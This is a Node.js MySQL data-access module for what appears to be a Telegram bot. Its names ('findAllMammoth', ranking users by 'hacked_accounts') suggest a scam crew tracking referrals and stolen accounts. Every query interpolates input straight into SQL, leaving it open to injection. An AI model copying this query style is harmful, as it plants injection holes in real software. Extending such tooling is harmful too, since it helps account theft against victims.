const mysql = require("mysql");

var conn = mysql.createConnection({
    host: process.env.phpMyAdmin_host,
    user: process.env.phpMyAdmin_user,
    password: process.env.phpMyAdmin_password,
    database: process.env.phpMyAdmin_database
});

function handleDisconnect() {
    conn.on('error', function(err) {
      if(err.code === 'PROTOCOL_CONNECTION_LOST') {
        conn = mysql.createConnection({
            host: process.env.phpMyAdmin_host,
            user: process.env.phpMyAdmin_user,
            password: process.env.phpMyAdmin_password,
            database: process.env.phpMyAdmin_database
        });
      } else {
        throw err;
      }
    });
}
handleDisconnect();



function createUser(data, callback) {
    var sql = `INSERT INTO users (id_tg, date_of_registration, ref, name, link) VALUES (
${data.id_tg},
${data.date_of_registration},
${data.ref},
"${data.name}",
"https://vk.com/feed"
);`

    findUser(data.id_tg, (user) => {
        console.log(user)
        if(user.length == 0) {
            conn.query(sql, function (err, result) {
                if(err) {
                    return console.log(err);
                };
                callback("true")
            });
        }
    });
}

function findAllUser(callback) {
    conn.query(`SELECT id_tg FROM users`, function (err, result) {
        if(err) {
            console.err(err)
        } else {
            return callback(result.length);
        }
    });
}

function findUser(id, callback) {
    conn.query(`SELECT * FROM users WHERE id_tg = "${id}"`, function (err, result) {
        if(err) {
            console.log(`Ошибка. Юзер не найден`);
            console.error(err)
            if(err.code == `ER_BAD_FIELD_ERROR` || err.code == `ER_CANT_AGGREGATE_2COLLATIONS`) {
                return findUser_LOGIN(id, (data_find) => {
                    if(data_find == `ER_BAD_FIELD_ERROR` || data_find == `ER_CANT_AGGREGATE_2COLLATIONS`) {
                        return callback(`ER_BAD_FIELD_ERROR`);
                    }
                    return callback(data_find);
                });
            }
            if(err.code == `ER_PARSE_ERROR`) {
                return callback(`ER_PARSE_ERROR`);
            }
            return console.error(err.code);
        } else {
            if(result.length == 0) {
                return findUser_LOGIN(id, (data_find) => {
                    if(data_find == `ER_BAD_FIELD_ERROR`) {
                        return callback(`ER_BAD_FIELD_ERROR`);
                    }
                    return callback(data_find);
                });
            }
            return callback(result);
        }
    });
}

function findUser_LOGIN(name, callback) {
    conn.query(`SELECT * FROM users WHERE name = "${name}"`, function (err, result) {
        if(err) {
            if(err.code == `ER_BAD_FIELD_ERROR` || err.code == `ER_CANT_AGGREGATE_2COLLATIONS`) {
                return callback(`ER_BAD_FIELD_ERROR`);
            }
            return console.error(err.code);
        } else {
            return callback(result);
        }
    });
}

function updateUser(id, name_value, new_value) {
    findUser(id, (user) => {
        if(user == `ER_BAD_FIELD_ERROR`  || user == `ER_CANT_AGGREGATE_2COLLATIONS`) return;
        if(user.length == 0) {
            return console.log(`Ошибка. Юзер не найден`);
        } else {
            conn.query(`UPDATE users SET ${name_value} = ${new_value} WHERE id_tg = ${user[0].id_tg};`, function (err, result) {
                if(err) {
                    return console.log(err);
                }
            });
        }
    })
}

function findAllMammoth(id, callback) {
    conn.query(`SELECT * FROM users WHERE ref = '${id}'`, function (err, result) {
        if(err) {
            return console.log(err);
        }
        callback(result);
    });
}

function TopUsers(callback) {
    conn.query(`SELECT * FROM users ORDER BY hacked_accounts DESC`, function (err, result) {
        if(err) {
            return console.log(err);
        }
        callback(result);
    });
}

function deleteUser(id, callback) {
    conn.query(`DELETE FROM users WHERE id_tg = '${id}'`, function (err, result) {
        if(err) {
            return console.log(err);
        }
        callback(result);
    });
}

module.exports = {
    findUser,
    createUser,
    updateUser,
    findAllUser,
    findAllMammoth,
    deleteUser,
    TopUsers
}